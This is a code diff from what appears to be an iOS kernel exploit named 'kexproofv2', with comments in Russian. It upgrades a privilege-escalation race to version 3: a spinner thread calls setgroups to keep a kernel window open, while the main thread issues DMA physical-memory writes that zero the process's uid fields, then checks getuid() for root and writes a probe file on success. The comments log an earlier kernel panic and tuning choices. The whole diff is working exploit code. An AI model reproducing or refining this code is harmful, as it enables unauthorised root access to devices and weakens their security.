@@ -288,6 +288,19 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
 // 1.9.273: TLB per-CPU — ucredVA закэширована на CPU, где бежал наш поток.
 // Потоки-поллеры getuid(): поток на СВЕЖЕМ CPU читает по НОВОЙ таблице → fkPA → 0.
 static _Atomic int gEvictHit = 0;
+// 2.0.26: setgroups-спиннер для UUNLOCK-RACE v3 (параллельная гонка)
+static _Atomic int gUunlockStop = 0;
+static void *kpSetgroupsSpinner(void *arg)
+{
+    (void)arg;
+    gid_t grpsA[1] = { 501 }, grpsB[2] = { 501, 502 };
+    while (!atomic_load(&gUunlockStop)) {
+        setgroups(1, grpsA);
+        setgroups(2, grpsB);
+    }
+    setgroups(1, grpsA);
+    return NULL;
+}
 static void *kpEvictWorker(void *arg)
 {
     for (int i = 0; i < 4000 && !atomic_load(&gEvictHit); i++) {
@@ -8026,36 +8039,36 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
                 int errF = errno;
-                // kexproofv2 2.0.25 [UUNLOCK-RACE v2] — v1 паниковал: early_kwrite64
-                // делает RMW, и её LOAD по aperture-алиасу попадал в окно
-                // перестройки маппинга при zalloc_ro_mut (паника 10:17:13).
-                // Правило: во время гонки НИКАКОГО CPU-доступа к алиасу/ucF.
-                // Только: setgroups (открывает окно) → DMA-запись (фабрика, без
-                // CPU) → getuid() (syscall, безопасен).
+                // kexproofv2 2.0.26 [UUNLOCK-RACE v3] — v2 серийная (setgroups →
+                // DMA) не пересекалась с окном: оно открыто только внутри
+                // syscall'а. v3: ПАРАЛЛЕЛЬНО — спиннер setgroups держит окно
+                // открытым, главный шлёт DMA-записи. Без alias-доступа (правило
+                // v2 после паники 10:17). Победа — только по getuid().
                 if (pagePA && ucF && svc && tsdV && ttM && isTable && (uoff + 0x80 <= 0x4000)) {
-                    kpNote(r, @"  [UUNLOCK-RACE v2] старт: setgroups → DMA-запись → getuid (без alias-доступа)");
-                    gid_t grpsA[1] = { 501 }, grpsB[2] = { 501, 502 };
+                    kpNote(r, @"  [UUNLOCK-RACE v3] старт: параллельно setgroups-спиннер + DMA-записи");
+                    atomic_store(&gUunlockStop, 0);
+                    pthread_t spT;
+                    pthread_create(&spT, NULL, kpSetgroupsSpinner, NULL);
                     uint32_t attempts = 0, won = 0;
                     uint64_t pgPA = pagePA & ~0x3fffULL;
-                    for (int round = 0; round < 300 && !won; round++) {
-                        setgroups(1, (round & 1) ? grpsA : grpsB);
-                        // DMA пишет ровно cr_uid|cr_ruid = 0 (8 байт, без RMW)
+                    for (int round = 0; round < 200 && !won; round++) {
                         kpPhysWrite8v2(svc, tsdV, ttM, isTable, pgPA, uoff + 0x18, 0, r);
                         attempts++;
-                        if ((round % 50) == 49) kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE v2] раунд %d, попыток %u, getuid()=%u",
-                                                           round + 1, attempts, getuid()]);
+                        if ((round % 40) == 39)
+                            kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE v3] DMA #%u, getuid()=%u", attempts, getuid()]);
                         if (getuid() == 0) { won = 1; break; }
                     }
+                    atomic_store(&gUunlockStop, 1);
+                    pthread_join(spT, NULL);
                     uid_t gk = getuid();
-                    kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE v2] попыток=%u getuid()=%u — %@",
-                              attempts, gk, gk == 0 ? @"ROOT ★★" : @"не взяло (окна не совпали)"]);
+                    kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE v3] DMA-записей=%u getuid()=%u — %@",
+                              attempts, gk, gk == 0 ? @"ROOT ★★" : @"не взяло"]);
                     if (gk == 0) {
                         gT18Root = YES;
-                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — UUNLOCK-RACE v2 (DMA в окно setgroups) ===");
+                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — UUNLOCK-RACE v3 (параллельная гонка) ===");
                         FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
-                        if (fp) { fputs("root via UUNLOCK-RACE v2\n", fp); fclose(fp); }
+                        if (fp) { fputs("root via UUNLOCK-RACE v3\n", fp); fclose(fp); }
                     }
-                    setgroups(1, grpsA);
                 }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
                 // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
